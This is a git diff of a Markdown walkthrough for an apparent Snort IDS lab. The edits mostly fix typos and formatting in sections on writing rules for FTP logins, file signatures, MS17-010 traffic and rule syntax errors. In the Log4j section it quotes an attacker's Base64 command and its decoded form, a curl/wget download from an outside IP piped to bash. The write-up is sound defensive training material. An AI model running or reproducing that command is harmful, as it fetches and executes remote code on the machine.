@@ -162,15 +162,10 @@ Once again we have a `local.rules` file to edit and a network capture to analyse
 
 We can tackle this very similarly to TASK 2.  Add the following rule to `local.rules`:
 ```dircolors
-# ----------------
-# LOCAL RULES
-# ----------------
-# This file intentionally does not come with signatures.  Put your local
-# additions here.
 alert tcp any 21 <> any any (msg: "Port 21 Detected"; sid:100001; rev:1;)
 ```
 
-Now simply run snort on the given capture file with these rules:
+Now simply run Snort on the given capture file with this new rules file:
 ```console
 ubuntu:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo snort -c local.rules -r ftp-png-gif.pcap -l .
 ```
@@ -209,6 +204,7 @@ ubuntu:~/Desktop/Exercise-Files/TASK-3 (FTP)$ sudo strings snort.log.1743327826 
 The hint provided with this question tells us that:
 >*Each failed FTP login attempt prompts a default message with the pattern; "530 User". Try to filter the given pattern in the inbound FTP traffic.*
 
+
 So we need to write a rule that looks for packets that include the text *"530 User"* (remember to comment out the previous rule):
 
 ```dircolors
@@ -245,7 +241,7 @@ Action Stats:
 
 This time we are tasked with detecting successful logins, so the process will be the same as for Question 3, but this time we need to match with the pattern *"230 User"* which indicates a successful login.
 
-```console
+```dircolors
 # ----------------
 # LOCAL RULES
 # ----------------
@@ -278,7 +274,7 @@ Action Stats:
 >What is the number of detected packets?
 
 Same as before, but this time we're looking for the string *"331 Password"*
-```console
+```dircolors
 # ----------------
 # LOCAL RULES
 # ----------------
@@ -312,8 +308,8 @@ Action Stats:
 >What is the number of detected packets?
 
 
-OK so this time we need to edit the rule we created for Question 5, to filter for those specific events where the username provided was `Administrator`.  This can easily be achived since we can use the `content` option in the rule multiple times:
-```console
+So, this time we need to edit the rule we created for Question 5 to filter for those specific events where the username provided was `Administrator`.  This can easily be acheived since we can use the `content` option in a rule multiple times:
+```dircolors
 # ----------------
 # LOCAL RULES
 # ----------------
@@ -359,7 +355,7 @@ ftp-png-gif.pcap  local.rules
 This is an interesting question.  Since we are analysing individual packets and a single file can be broken up into several packets - how do we detect the transmission of a specific file type over the network?
 The answer lies in **File Signatures**.  Each file type has a specific string of bits inside its contents that identifies the type of file it is (even if the extension is changed).  A quick Google search gives us the [file signature for PNG files](https://en.wikipedia.org/wiki/List_of_file_signatures#:~:text=89%2050%204E%2047%200D%200A%201A%200A) which is, `89 50 4E 47 0D 0A 1A 0A`.
 
-So this should be quote simple now - just look for that file siganture using the `content` option in the rules. However - **keep in mind that the file signature is in hexadecimal**, so we need to use `|` in our rule to instruct Snort to match hexadecimal byte values. 
+So this should be quite simple now - just look for that file siganture using the `content` option in the rules. However - **keep in mind that the file signature is in hexadecimal**, so we need to use `|` in our rule to instruct Snort to match hexadecimal byte values. 
 
 So the `local.rules` file needs to look something like this now:
 ```dircolors
@@ -372,7 +368,7 @@ So the `local.rules` file needs to look something like this now:
 alert icmp any any <> any any  (msg: "ICMP Packet Found"; sid: 100001; rev:1;)
 alert tcp any any <> any any (msg: "PNG file detected"; content:"|89 50 4E 47 0D 0A 1A 0A|"; sid:100002; rev:1;)
 ```
-Note that there already is an existing rule in the file so we need to increment the `sid` for our rule by 1.
+Note that there already is an existing rule in the file so we need to increment the `sid` for our newly-added rule by 1.
 
 We can now run Snort with the updated rules file:
 ```console
@@ -425,7 +421,7 @@ alert tcp any any <> any any (msg: "GIF file detected"; content:"|47 49 46 38 37
 alert tcp any any <> any any (msg: "GIF file detected"; content:"|47 49 46 38 39 61|"; sid:100003; rev:1;)
 ```
 
-Note that the two file signatures are added as two seperate rules.  If we were to include them as two `content` options on the same rule, the rule would only match when both strings are detected.
+Note that the two file signatures are added as two seperate rules.  If we were to include them as two `content` options on the same rule, then the rule would only match when _both_ strings are detected.
 
 We can now delete the old log file and run Snort with the updated rules:
 ```console
@@ -497,7 +493,7 @@ Host: [REDACTED]:2710
 Connection: Keep-Alive
 ```
 
-Note - that we can get to the answer also by using the `-X` switch with Snort to look inside teh packet headers:
+Note - that we can get to the answer also by using the `-X` switch with Snort to look inside the packet headers:
 ```console
 ubuntu:~/Desktop/Exercise-Files/TASK-5 (TorrentMetafile)$ sudo snort -r snort.log.1743331468 -X
 ```
@@ -514,25 +510,26 @@ This is also found in the output we got for Question 2.
 
 ---
 
-##Task 6 - TROUBLESHOOTING RULE SYNTAX ERRORS
+## Task 6 - TROUBLESHOOTING RULE SYNTAX ERRORS
 
-This time when we navigate to the task folder we see that we have 7 different rule files and a single pcap:
+This time when we navigate to the task folder we see that we have seven different rule files and a single pcap:
 ```console
 ubuntu:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ ls
 local-1.rules  local-2.rules  local-3.rules  local-4.rules  local-5.rules  local-6.rules  local-7.rules  mx-1.pcap
 ```
 
-The task description tels us that;
+The task description tells us that;
 >In this section, you need to fix the syntax errors in the given rule files. 
 >You can test each ruleset with the following command structure;
 >sudo snort -c local-X.rules -r mx-1.pcap -A console
+
 
 **Question 1**
 >Fix the syntax error in local-1.rules file and make it work smoothly.
 >
 >What is the number of the detected packets?
 
-Let's start by running the command we are given with `local-1.rules`:
+Let's start by running the command we are given in the task description with `local-1.rules`:
 ```console
 ubuntu:~/Desktop/Exercise-Files/TASK-6 (Troubleshooting)$ sudo snort -c local-1.rules -r mx-1.pcap -A console
 Running in IDS mode
@@ -658,8 +655,10 @@ alert tcp any 80,443 -> any any (msg: "HTTPX Packet Found"; sid:1000002; rev:1;)
 This time the error output tells us that we are looking for an `Illegal direction specifier: <-`
 
 Snort rules allow us to use one of two direction operators; `<>` or `->`.  However the second rule is using `<-` which is not allowed.  The message in the rule also tells us that it's looking for inbound ICMP packets, so the direction operator needs to be changed to `->`.
-There is also another mistake in the second rule and the `;` following `sid` needs to be changed to a `:`
-Similarly the `:` after 1`"HTTPX Packet Found"` in the third rule needs to be changed to a `;`
+
+There is also another mistake in the second rule and the `;` following `sid` needs to be changed to a `:`.
+
+Similarly the `:` after 1`"HTTPX Packet Found"` in the third rule needs to be changed to a `;`.
 
 ```dircolors
 alert icmp any any <> any any (msg: "ICMP Packet Found"; sid:1000001; rev:1;)
@@ -675,7 +674,7 @@ alert tcp any any -> any 80,443 (msg: "HTTPX Packet Found": sid:1000003; rev:1;)
 
 This time around we are told that we are looking for a _logical_ error instead of a _syntax_ error.  This means that the rules are crafted in such a way that will allow snort to run without any errors but they will not match on the desired packets.
 
-If we look inside `local-6.rules` we see that the rule is trying to look for HTTP GET requests but is trying to do so using the hex value `67 65 74`.  If we translate this to ASCII (using [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NjcgNjUgNzQ)) we get the word `get`.  However the pattern matching in the rule is case-sensitive and we want it to match with `GET` (uppercase), so the hex value should read `|47 45 54|`.
+If we look inside `local-6.rules` we see that the rule is trying to look for HTTP GET requests but is trying to do so using the hex value `67 65 74`.  If we translate this to ASCII (using [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')&input=NjcgNjUgNzQ)) we get the word `get`.  However the pattern-matching in the rule is case-sensitive and we want it to match with `GET` (uppercase), so the hex value should read `|47 45 54|`.
 
 ```dircolors
 alert tcp any any <> any 80  (msg: "GET Request Found"; content:"|47 45 54|"; sid: 100001; rev:1;)
@@ -692,7 +691,7 @@ alert tcp any any <> any 80  (msg: "GET Request Found"; content:"GET"; sid: 1000
 >
 >What is the name of the required option:
 
-Once again we are looking for a _logical_ error here.  This time the rule seems to work fine and even gives us some detections on the first run.  However wehn we look inside `local-7.rules` we can see that the rule is missing a `msg`.  This will still produce matches but the alerts will contain no information.
+Once again we are looking for a _logical_ error here.  This time the rule seems to work fine and even gives us some detections on the first run.  However when we look inside `local-7.rules` we can see that the rule is missing a `msg`.  This will still produce matches but the alerts will contain no information.
 The rule is looking for the hex value `2E 68 74 6D 6C` which translates to `.html`.  So we can add a suitably descriptive message to it:
 ```dircolors
 alert tcp any any <> any 80  (msg:".html file detected"; content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)
@@ -737,7 +736,7 @@ alert tcp any any <> any any (msg:"Keyword match"; content:"\\IPC$"; sid:1000001
 >
 >What is the requested path?
 
-Let's have a look inside the matchign headers:
+Let's have a look inside the matching headers:
 ```console
 ubuntu:~/Desktop/Exercise-Files/TASK-7 (MS17-10)$ sudo snort -r snort.log.1743334798 -X
 ```
@@ -839,7 +838,7 @@ alert tcp any any <> any any  (msg: "Packet size between 770 and 855 bytes"; dsi
 >
 >What is the name of the used encoding algorithm?
 
-We can browse through the packet header using the `-X` switch with snort.  Scrolling through the matched packets we see in the second-to-last packet that Base64 encoding was used.
+We can browse through the packet headers using the `-X` switch with Snort.  Scrolling through the matched packets we see in the second-to-last packet that Base64 encoding was used.
 ```console
 ubuntu:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -r snort.log.1743335983 -X
 ```
@@ -849,7 +848,7 @@ ubuntu:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -r snort.log.17433359
 >
 >What is the IP ID of the corresponding packet?
 
-Looking at the same packet we found for Question 5 we can see the ID as a 5-diit number in the header:
+Looking at the same packet we found for Question 5 we can see the ID as a 5-digit number in the header:
 
 ```console
 =+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
@@ -866,7 +865,7 @@ TCP Options (3) => NOP NOP TS: 1584792788 1670627000
 >
 >What is the attacker's command?
 
-Using cyberchef we can decode the Base64 encoded command from `KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=` to:
+Using [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=S0dOMWNtd2dMWE1nTkRVdU1UVTFMakl3TlM0eU16TTZOVGczTkM4eE5qSXVNQzR5TWpndU1qVXpPamd3Zkh4M1oyVjBJQzF4SUMxUExTQTBOUzR4TlRVdU1qQTFMakl6TXpvMU9EYzBMekUyTWk0d0xqSXlPQzR5TlRNNk9EQXBmR0poYzJnPQ&oeol=CR) we can decode the Base64 encoded command from `KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=` to:
 `(curl -s [REDACTED]/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash`
 
 **Question 8**
